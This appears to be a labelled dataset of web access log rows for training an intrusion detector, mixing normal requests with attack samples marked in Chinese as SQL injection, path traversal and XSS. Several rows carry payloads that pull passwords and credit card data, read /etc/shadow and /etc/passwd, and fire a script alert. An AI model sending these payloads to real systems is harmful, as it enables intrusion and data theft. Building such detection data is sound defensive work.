+172.16.0.3,20/May/2025:11:59:27 +0800,GET,/category/electronics,200,10599,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+198.51.100.7,20/May/2025:16:43:02 +0800,GET,/css/style.css,200,39274,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,14,0.14285714285714285,0,0,1,0,0.19931633558722886,0,正常
+8.8.8.8,20/May/2025:04:06:24 +0800,GET,/images/banner.jpg,200,8530,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,18,0.1111111111111111,0,0,1,0,0.12088889255257311,0,正常
+192.168.1.15,20/May/2025:22:35:08 +0800,GET,/images/logo.png,200,16462,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,16,0.125,0,0,1,0,0.1790458069822886,0,正常
+10.0.0.20,20/May/2025:01:24:26 +0800,GET,"/query?q=1' UNION SELECT concat(user,0x3a,password) FROM users--",400,4482,curl/8.4.0,64,0.125,1,0,0,1,0.47108952359647344,1,SQL注入
+192.168.1.15,20/May/2025:07:23:20 +0800,GET,/static/../../../etc/shadow,403,1524,curl/8.4.0,27,0.2222222222222222,0,0,5,0,0.9699957818696624,1,路径遍历
+223.5.5.5,20/May/2025:17:05:11 +0800,GET,/about.html,200,9583,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
+172.16.0.3,20/May/2025:04:37:58 +0800,GET,/contact.html,200,22701,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,13,0.07692307692307693,0,0,0,0,0.3762649369429833,0,正常
+192.168.1.12,20/May/2025:18:56:53 +0800,GET,"/query?q=1' UNION SELECT concat(user,0x3a,password) FROM users--",403,3262,python-requests/2.31.0,64,0.125,1,0,0,1,0.47108952359647344,1,SQL注入
+192.168.1.10,20/May/2025:18:45:48 +0800,GET,/category/electronics,200,44255,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,21,0.09523809523809523,0,0,1,0,0.11768903673298393,0,正常
+10.0.0.8,20/May/2025:02:12:33 +0800,GET,/order?id=1 UNION SELECT credit_card FROM payments--,400,158,Mozilla/5.0 (compatible; Nmap Scripting Engine),52,0.09615384615384616,1,0,0,1,0.5222237497694325,1,SQL注入
+10.0.0.5,20/May/2025:13:05:26 +0800,GET,/..%2F..%2F..%2Fetc%2Fpasswd,500,2300,python-requests/2.31.0,20,0.25,0,0,4,0,0.7004716638371997,1,未知异常
+192.168.1.11,20/May/2025:02:44:29 +0800,GET,/register.html,301,36299,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,14,0.07142857142857142,0,0,0,0,0.5039821135789101,0,正常
+192.168.1.11,20/May/2025:13:24:50 +0800,GET,/feedback?msg=<details open ontoggle=alert(1)>,403,2174,Wget/1.21.3,46,0.17391304347826086,0,1,0,1,0.2782187912521493,1,XSS攻击
+172.16.0.15,20/May/2025:07:18:06 +0800,GET,/index.html,200,27355,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15,11,0.09090909090909091,0,0,0,0,0.0,0,正常
